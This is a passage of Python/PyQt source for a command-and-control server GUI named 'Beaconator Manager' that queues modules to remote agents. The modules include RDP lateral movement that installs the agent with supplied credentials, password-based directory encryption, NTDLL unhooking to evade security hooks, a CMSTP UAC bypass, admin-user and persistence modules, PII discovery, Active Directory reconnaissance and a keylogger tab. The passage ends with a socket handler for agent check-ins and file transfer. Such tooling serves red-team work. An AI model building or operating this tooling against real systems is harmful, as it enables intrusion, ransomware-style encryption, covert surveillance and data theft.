        self.installdir_input.setPlaceholderText("C:\\Users\\user1\\AppData\\Local")
        
        # Add parameters to grid layout
        param_layout.addWidget(URL_label, 0, 0)
        param_layout.addWidget(self.URL_input, 0, 1)
        param_layout.addWidget(downloadpath_label, 1, 0)
        param_layout.addWidget(self.downloadpath_input, 1, 1)
        param_layout.addWidget(installdir_label, 2, 0)
        param_layout.addWidget(self.installdir_input, 2, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_InstallMSI)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_InstallMSI(self):  
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        
        params = [param for param in [
            self.URL_input.text(),
            self.downloadpath_input.text(),
            self.installdir_input.text()
        ] if param]
        
        command = f"execute_module|InstallMSI|{','.join(params)}"

        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_RDPConnect(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module connects to a host via RDP and installs the agent")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        hostname_label = QLabel("Hostname/IP: ")
        self.hostname_input = QLineEdit()
        self.hostname_input.setPlaceholderText("192.168.124.125")
        
        username_label = QLabel("Username: ")
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Administrator")

        password_label = QLabel("Password: ")
        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText("hunter2")

        domain_label = QLabel("Domain: ")
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText("lab.local")
        self.domain_input.setToolTip(
            "This parameter is optional"
        )

        serverIP_label = QLabel("C2 Server IP: ")
        self.serverIP_input = QLineEdit()
        self.serverIP_input.setPlaceholderText("192.168.124.22")
        self.serverIP_input.setToolTip(
            "This is the IP you want the new agent to connect to"
        )
        
        # Add parameters to grid layout
        param_layout.addWidget(hostname_label, 0, 0)
        param_layout.addWidget(self.hostname_input, 0, 1)
        param_layout.addWidget(username_label, 1, 0)
        param_layout.addWidget(self.username_input, 1, 1)
        param_layout.addWidget(password_label, 2, 0)
        param_layout.addWidget(self.password_input, 2, 1)
        param_layout.addWidget(domain_label, 3, 0)
        param_layout.addWidget(self.domain_input, 3, 1)
        param_layout.addWidget(serverIP_label, 4, 0)
        param_layout.addWidget(self.serverIP_input, 4, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_RDPConnect)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_RDPConnect(self):  
        hostname = self.hostname_input.text()
        username = self.username_input.text()    
        password = self.password_input.text()
        domain = self.domain_input.text()
        serverIP = self.serverIP_input.text()

        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|RDPConnect|{hostname},{username},{password},{serverIP},{domain}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_EncryptDirectory(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module encrypts the target directory with the specified password")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        directory_label = QLabel("Directory: ")
        self.directory_input = QLineEdit()
        self.directory_input.setPlaceholderText("C:\\Users\\Administrator\\Documents")
        self.directory_input.setToolTip(
            "Enter the full file path as it appears on the target system"
        )
        
        encryptpassword_label = QLabel("Password: ")
        self.encryptpassword_input = QLineEdit()
        self.encryptpassword_input.setPlaceholderText("P@ssw0rd123!")
        
        # Add parameters to grid layout
        param_layout.addWidget(directory_label, 0, 0)
        param_layout.addWidget(self.directory_input, 0, 1)
        param_layout.addWidget(encryptpassword_label, 1, 0)
        param_layout.addWidget(self.encryptpassword_input, 1, 1)

        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_EncryptDirectory)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_EncryptDirectory(self):  
        directory = self.directory_input.text()
        password = self.encryptpassword_input.text()    

        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|EncryptDirectory|{directory},{password}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_DecryptDirectory(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module decrypts the target directory with the specified password")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        decrypt_directory_label = QLabel("Directory: ")
        self.decrypt_directory_input = QLineEdit()
        self.decrypt_directory_input.setPlaceholderText("C:\\Users\\Administrator\\Documents")
        self.decrypt_directory_input.setToolTip(
            "Enter the full file path as it appears on the target system\n"
        )
        
        decryptpassword_label = QLabel("Password: ")
        self.decryptpassword_input = QLineEdit()
        self.decryptpassword_input.setPlaceholderText("P@ssw0rd123!")
        
        # Add parameters to grid layout
        param_layout.addWidget(decrypt_directory_label, 0, 0)
        param_layout.addWidget(self.decrypt_directory_input, 0, 1)
        param_layout.addWidget(decryptpassword_label, 1, 0)
        param_layout.addWidget(self.decryptpassword_input, 1, 1)

        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_DecryptDirectory)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_DecryptDirectory(self):  
        directory = self.decrypt_directory_input.text()
        password = self.decryptpassword_input.text()    

        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|DecryptDirectory|{directory},{password}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_UnhookNTDLL(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module will attempt to unhook NTDLL by restoring a clean version from sys32")
        explanation.setWordWrap(True)  # Allows text to wrap naturally
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create the button
        UnhookNTDLL_btn = QPushButton("Queue Module")
        UnhookNTDLL_btn.clicked.connect(self.send_UnhookNTDLL)  

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add widgets to layout
        layout.addWidget(explanation)
        layout.addWidget(UnhookNTDLL_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_UnhookNTDLL(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|UnhookNTDLL"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_DomainTrustRecon(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        explanation = QLabel("This module enumerates trusted domains in the current Active Directory environment")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        self.font_manager.add_relative_font_widget(explanation, 2)
        
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_DomainTrustRecon)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(explanation)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_DomainTrustRecon(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|DomainTrustRecon"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_EnumerateDCs(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        explanation = QLabel("This module identifies all Domain Controllers in the current domain")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        self.font_manager.add_relative_font_widget(explanation, 2)
        
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_EnumerateDCs)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(explanation)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_EnumerateDCs(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|EnumerateDCs"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_IdentifyDomainAdmins(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        explanation = QLabel("This module enumerates all members of the Domain Admins group, providing visibility into high-privilege account holders in the domain.")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        self.font_manager.add_relative_font_widget(explanation, 2)
        
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_IdentifyDomainAdmins)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(explanation)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_IdentifyDomainAdmins(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|IdentifyDomainAdmins"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_CheckUnconstrainedDelegation(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        explanation = QLabel("This module identifies computers with unconstrained delegation enabled, which could represent potential security vulnerabilities in the domain.")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        self.font_manager.add_relative_font_widget(explanation, 2)
        
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_CheckUnconstrainedDelegation)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(explanation)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_CheckUnconstrainedDelegation(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|CheckUnconstrainedDelegation"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_ActiveUserMembership(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        explanation = QLabel("This module enumerates all group memberships for the currently active user, providing a comprehensive view of the user's permissions and access levels within the domain.")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        self.font_manager.add_relative_font_widget(explanation, 2)
        
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_ActiveUserMembership)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(explanation)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_ActiveUserMembership(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|ActiveUserMembership"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_CMSTP_UAC_Bypass(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module uses CMSTP to auto accept UAC prompt and launch command elevated")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        command_label = QLabel("Command: ")
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("calc.exe")
        
        # Add parameters to grid layout
        param_layout.addWidget(command_label, 0, 0)
        param_layout.addWidget(self.command_input, 0, 1)

        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_CMSTP_UAC_Bypass)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_CMSTP_UAC_Bypass(self):  
        command = self.command_input.text()  

        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|CMSTP_UAC_Bypass|{command}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")


    def on_nav_changed(self, current, previous):
        if not current:
            return
                
        # Map tree items to stack indices
        command_map = {
            "Command Execution": 0,
            "WinGet PS Execution": 1,
            "Basic Recon": 2,
            "Discover PII": 3,
            "Enumerate DCs": 4,
            "Domain Trusts": 5,
            "Domain Admins": 6,
            "Unconstrained Delegation": 7,
            "Active User Membership": 8,
            "Port Scanner": 9,
            "Deny Outbound Firewall": 10,
            "Host File URL Block": 11,
            "Unhook NTDLL": 12,
            "CMSTP UAC Bypass": 13,
            "Run As User": 14,
            "Add Admin User": 15,
            "Add Startup to Registry": 16,
            "Add Scheduled Task": 17,
            "Install MSI": 18,
            "RDP Connection": 19,
            "Encrypt Files": 20,
            "Decrypt Files": 21,
        }
        
        command_name = current.text(0)
        if command_name in command_map:
            self.cmd_stack.setCurrentIndex(command_map[command_name])
            
            # Get the full path from root to current item
            path_parts = []
            item = current
            while item:
                path_parts.insert(0, item.text(0))
                item = item.parent()
                
            # Construct the documentation path
            doc_section = '.'.join(['Agents', 'Modules'] + path_parts)
            print(f"Looking for documentation section: {doc_section}")
            self.doc_panel.set_content(doc_section)

    def show_tooltip(self, widget, anchor_widget=None, message="Done!"):
        # Append tooltip styling
        self.setStyleSheet(self.styleSheet() + """
            QToolTip {
                color: #90EE90;               
                border: 1px solid #2E8B57;  
                padding: 5px;
            }
        """)
        
        # Get metrics to calculate text width
        font_metrics = widget.fontMetrics()
        text_width = font_metrics.horizontalAdvance(message)
        
        # If anchor_widget provided, position above its center
        if anchor_widget:
            anchor_rect = anchor_widget.rect()
            anchor_pos = anchor_widget.mapToGlobal(QPoint(
                anchor_rect.center().x() - (text_width // 2),
                anchor_rect.top()
            ))
        else:
            # Default positioning above the target widget
            anchor_pos = widget.mapToGlobal(widget.rect().topLeft())
        
        # Show tooltip with increased vertical offset
        QToolTip.showText(
            QPoint(anchor_pos.x(), anchor_pos.y() - 50),
            message,
            widget,
            widget.rect(),
            30000
        )

    def set_agent(self, agent_id: str):
        """Switch to monitoring a different agent"""
        self.current_agent_id = agent_id
        self.output_display.set_agent(agent_id)

    def cleanup(self):
        """Cleanup resources before widget destruction"""
        self.output_display.cleanup()


class MainWindow(QMainWindow):
    def __init__(self, server_manager: ServerManager):
        super().__init__()
        self.server_manager = server_manager
        self.agent_repository = server_manager.agent_repository
        self.command_processor = server_manager.command_processor
        self.file_transfer_service = server_manager.file_transfer_service
        self.module_handler = server_manager.module_handler
        self.config_manager = ConfigManager()
        self.setup_ui()
        self.start_background_workers()

    def setup_ui(self):
        # Set application-wide font using stored settings
        app = QApplication.instance()
        font_1 = QFontDatabase.addApplicationFont("resources/Montserrat-Regular.ttf")
        mont_families = QFontDatabase.applicationFontFamilies(font_1)

        font_2 = QFontDatabase.addApplicationFont("resources/SourceCodePro-Regular.ttf")
        code_families = QFontDatabase.applicationFontFamilies(font_2)

        font_3 = QFontDatabase.addApplicationFont("NotoSerif-Regular.ttf")
        serif_families = QFontDatabase.applicationFontFamilies(font_3)

        main_font = QFont()
        main_font.setFamilies(mont_families)
        main_font.setPointSize(self.config_manager.get_font_size())
        main_font.setHintingPreference(QFont.HintingPreference.PreferNoHinting)
        app.setFont(main_font)


        self.setWindowTitle("Beaconator Manager")
        self.setMinimumSize(1200, 800)
        self.setWindowIcon(QIcon(str(Path(config.RESOURCES_FOLDER) / "icon.ico")))

        # Create main widget and layout
        main_widget = QWidget()
        main_layout = QHBoxLayout()
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Add navigation menu
        self.nav_menu = NavigationMenu()
        self.nav_menu.nav_changed.connect(self.on_nav_changed)
        self.nav_menu.doc_panel_toggled.connect(self.toggle_documentation)
        main_layout.addWidget(self.nav_menu)

        # Create a container widget for content and documentation panel
        content_container = QWidget()
        container_layout = QStackedLayout()
        container_layout.setStackingMode(QStackedLayout.StackingMode.StackAll)
        container_layout.setContentsMargins(0, 0, 0, 0)

        # Create stack widget for main content
        self.content_stack = QStackedWidget()
        container_layout.addWidget(self.content_stack)

        # Create documentation manager and panel
        self.doc_manager = DocumentationManager()
        self.doc_panel = DocumentationPanel(self.doc_manager)
        self.doc_panel.hide()
        self.doc_panel.set_content("--- Introduction ---")
        container_layout.addWidget(self.doc_panel)

        # Set layout for container
        content_container.setLayout(container_layout)
        main_layout.addWidget(content_container)

        # Create content pages
        self.setup_agents_page(self.doc_panel)
        self.setup_settings_page()
        self.setup_commands_page()
        self.setup_files_page()

        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)

    def setup_agents_page(self, doc_panel):
        agents_widget = QWidget()
        main_layout = QVBoxLayout()  
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)
        
        # Create content layout
        content_layout = QHBoxLayout()
        content_layout.setSpacing(0)
        content_layout.setContentsMargins(0, 0, 0, 0)
        
        # Create left side with the agent table and log widget
        left_widget = QWidget()
        left_layout = QVBoxLayout()
        left_layout.setContentsMargins(0, 0, 0, 0)
        
        self.agent_table = AgentTableWidget()
        self.agent_table.agent_selected.connect(self.on_agent_selected)
        
        # Add splitter between table and log
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(self.agent_table)
        
        # Add log widget
        self.log_widget = LogWidget()
        splitter.addWidget(self.log_widget)
        
        # Set initial sizes for splitter
        splitter.setSizes([500, 500])
        
        left_layout.addWidget(splitter)
        left_widget.setLayout(left_layout)
        
        # Create right panel
        right_panel = QTabWidget()
        self.command_widget = CommandWidget(
            self.agent_repository, 
            self.module_handler,
            doc_panel=doc_panel  
        )
        right_panel.addTab(self.command_widget, "Modules")
        
        self.file_transfer_widget = FileTransferWidget(self.agent_repository)
        right_panel.addTab(self.file_transfer_widget, "File Transfer")

        self.keylogger_widget = KeyLoggerDisplay(self.agent_repository)
        right_panel.addTab(self.keylogger_widget, "KeyLogger")

        self.agent_settings_widget = AgentSettingsWidget(self.agent_repository)
        right_panel.addTab(self.agent_settings_widget, "Agent Settings")

        # Add widgets to content layout
        content_layout.addWidget(left_widget)
        content_layout.addWidget(right_panel)
        
        # Create content widget and set its layout
        content_widget = QWidget()
        content_widget.setLayout(content_layout)
        
        # Add content widget to main layout
        main_layout.addWidget(content_widget)
        
        agents_widget.setLayout(main_layout)
        self.content_stack.addWidget(agents_widget)
        
        # Connect logger signal to log widget
        logger.new_log.connect(self.log_widget.append_log)

    def setup_settings_page(self):
        settings_page = SettingsPage(
            config_manager=self.config_manager,
            server_manager=self.server_manager,  
            parent=self
        )
        self.content_stack.addWidget(settings_page)

    def setup_commands_page(self):

        self.content_stack.addWidget(QWidget())  # Placeholder

    def setup_files_page(self):

        self.content_stack.addWidget(QWidget())  # Placeholder

    def on_nav_changed(self, page_id: str):
        """Handle navigation changes"""
        page_indices = {
            "agents": 0,
            "settings": 1
        }
        self.content_stack.setCurrentIndex(page_indices[page_id])
        self.toggle_documentation(False)
        self.nav_menu.set_current_page(page_id)

    def toggle_documentation(self, show: bool):
        """Handle documentation panel visibility"""
        if show:
            self.doc_panel.show_panel()
        else:
            self.doc_panel.hide_panel()

    def start_background_workers(self):
        self.update_worker = AgentUpdateWorker(self.agent_repository)
        self.update_worker.agent_updated.connect(self.agent_table.update_agents)
        self.update_worker.start()

    def on_agent_selected(self, agent_id: str):
        self.command_widget.set_agent(agent_id)
        self.file_transfer_widget.set_agent(agent_id)
        self.agent_settings_widget.set_agent(agent_id)
        self.keylogger_widget.set_agent(agent_id)

    def closeEvent(self, event):
        """Cleanup resources when window is closed"""
        # Stop command widget monitor
        if hasattr(self, 'command_widget'):
            self.command_widget.cleanup()
        
        # Stop background workers
        if hasattr(self, 'update_worker'):
            self.update_worker.stop()
            self.update_worker.wait()
            
        event.accept()

class ConnectionHandler:
    """Handles network connections and routes commands"""
    def __init__(self, command_processor: CommandProcessor, 
                 file_transfer_service: FileTransferService,
                 buffer_size: int):
        self.command_processor = command_processor
        self.file_transfer_service = file_transfer_service
        self.buffer_size = buffer_size
        self.single_transaction_commands = {
            "register", "request_action", "checkin", "command_output", "keylogger_output"
        }

    def handle_connection(self, sock: socket.socket, client_address: tuple):
        """Main connection handler that routes to appropriate processors"""
        try:
            sock.settimeout(5.0)  # 5 second timeout for initial message
            initial_data = sock.recv(self.buffer_size).decode('utf-8').strip()
            if not initial_data:
                return

            parts = initial_data.split('|')
            command = parts[0] if parts else ""

            if command in ("to_agent", "from_agent"):
                self._handle_file_transfer(sock, command, parts)
            else:
                self._handle_command(sock, initial_data, client_address)

        except Exception as e:
            logger.log_message(f"Connection Error: {client_address[0]}:{client_address[1]} - {str(e)}")
        finally:
            try:
                sock.close()
            except:
                pass
           # logger.log_message(f"Connection closed for {client_address}")

    def _handle_file_transfer(self, sock: socket.socket, command: str, parts: list):
        """Handle file transfer operations"""
        logger.log_message(f"Entering _handle_file_transfer with command: {command}")
        if len(parts) < 2:
            logger.log_message("Invalid file transfer command - missing parts")
            sock.send(b"ERROR|Invalid file transfer command")
            return

        filename = parts[1]
        logger.log_message(f"Processing file transfer for: {filename}")
        
        if command == "to_agent":
            logger.log_message("Handling to_agent command")
            self.file_transfer_service.send_file(sock, filename)
        else:  # from_agent
            logger.log_message("Handling from_agent command")
            try:
                logger.log_message("Sending READY signal")
                sock.send(b"READY")
